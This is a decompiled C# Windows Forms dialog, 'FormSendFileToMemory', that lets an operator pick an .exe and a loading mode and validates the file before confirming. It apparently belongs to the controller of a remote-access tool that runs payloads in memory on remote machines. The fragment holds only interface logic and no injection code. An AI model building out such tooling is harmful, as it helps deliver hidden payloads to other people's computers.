using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Helper;

namespace Server
{
	// Token: 0x02000028 RID: 40
	public partial class FormSendFileToMemory : Form
	{
		// Token: 0x06000170 RID: 368 RVA: 0x000027E8 File Offset: 0x000009E8
		public FormSendFileToMemory()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000171 RID: 369 RVA: 0x000027F6 File Offset: 0x000009F6
		private void SendFileToMemory_Load(object sender, EventArgs e)
		{
			this.comboBox1.SelectedIndex = 0;
			this.comboBox2.SelectedIndex = 0;
		}

		// Token: 0x06000172 RID: 370 RVA: 0x0001977C File Offset: 0x0001797C
		private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			int selectedIndex = this.comboBox1.SelectedIndex;
			if (selectedIndex == 0)
			{
				this.label3.Visible = false;
				this.comboBox2.Visible = false;
				return;
			}
			if (selectedIndex != 1)
			{
				return;
			}
			this.label3.Visible = true;
			this.comboBox2.Visible = true;
		}

		// Token: 0x06000173 RID: 371 RVA: 0x000197D0 File Offset: 0x000179D0
		private void button1_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "(*.exe)|*.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.toolStripStatusLabel1.Text = Path.GetFileName(openFileDialog.FileName);
					this.toolStripStatusLabel1.Tag = openFileDialog.FileName;
					this.toolStripStatusLabel1.ForeColor = Color.Green;
					this.IsOK = true;
					if (this.comboBox1.SelectedIndex != 0)
					{
						goto IL_DD;
					}
					try
					{
						new ReferenceLoader().AppDomainSetup(openFileDialog.FileName);
						this.IsOK = true;
						return;
					}
					catch
					{
						this.toolStripStatusLabel1.ForeColor = Color.Red;
						ToolStripStatusLabel toolStripStatusLabel = this.toolStripStatusLabel1;
						toolStripStatusLabel.Text += " Invalid!";
						this.IsOK = false;
						return;
					}
				}
				this.toolStripStatusLabel1.Text = "";
				this.toolStripStatusLabel1.ForeColor = Color.Black;
				this.IsOK = true;
				IL_DD:;
			}
		}

		// Token: 0x06000174 RID: 372 RVA: 0x00002810 File Offset: 0x00000A10
		private void button2_Click(object sender, EventArgs e)
		{
			if (this.IsOK)
			{
				base.Hide();
			}
		}

		// Token: 0x06000175 RID: 373 RVA: 0x00002820 File Offset: 0x00000A20
		private void Button3_Click(object sender, EventArgs e)
		{
			this.IsOK = false;
			base.Hide();
		}

		// Token: 0x0400014E RID: 334
		public bool IsOK;
	}
}
